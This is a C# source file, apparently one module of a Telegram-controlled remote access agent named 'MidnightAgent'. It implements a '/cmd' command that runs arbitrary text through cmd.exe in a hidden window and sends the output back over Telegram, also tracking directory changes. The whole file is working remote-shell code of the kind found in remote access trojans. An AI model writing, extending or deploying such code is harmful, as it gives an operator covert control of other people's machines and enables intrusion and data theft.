using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /cmd - Execute shell command
    /// </summary>
    public class ShellFeature : IFeature
    {
        public string Command => "cmd";
        public string Description => "Execute a shell command";
        public string Usage => "/cmd <command>";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
            {
                return Task.FromResult(FeatureResult.Fail("Usage: /cmd <command>"));
            }

            string command = string.Join(" ", args);

            // Special handling for 'cd' to propagate state
            if (command.StartsWith("cd ", StringComparison.OrdinalIgnoreCase) || command.Equals("cd", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    string path = command.Length > 3 ? command.Substring(3).Trim() : Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                    path = Environment.ExpandEnvironmentVariables(path);
                    
                    if (string.IsNullOrEmpty(path)) path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                    System.IO.Directory.SetCurrentDirectory(path);
                    return Task.FromResult(FeatureResult.Ok($"📂 Directory changed to: {System.IO.Directory.GetCurrentDirectory()}"));
                }
                catch (Exception ex)
                {
                    return Task.FromResult(FeatureResult.Fail($"Failed to change directory: {ex.Message}"));
                }
            }

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit(30000); // 30 second timeout

                    string result = output;
                    if (!string.IsNullOrEmpty(error))
                    {
                        result += $"\n\n[STDERR]\n{error}";
                    }

                    if (string.IsNullOrWhiteSpace(result))
                    {
                        result = "(No output)";
                    }

                    // Truncate if too long
                    result = MessageHelper.Truncate(result, 3800);

                    // Format as code block
                    string formatted = $"<b>$ {MessageHelper.EscapeHtml(command)}</b>\n<pre>{MessageHelper.EscapeHtml(result)}</pre>";

                    // If still too long, send as file
                    if (formatted.Length > 4000)
                    {
                        string tempPath = Path.Combine(Path.GetTempPath(), "output.txt");
                        File.WriteAllText(tempPath, result);
                        return Task.FromResult(FeatureResult.File(tempPath, $"Output of: {command}"));
                    }

                    return Task.FromResult(FeatureResult.Ok(formatted));
                }
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }
    }
}
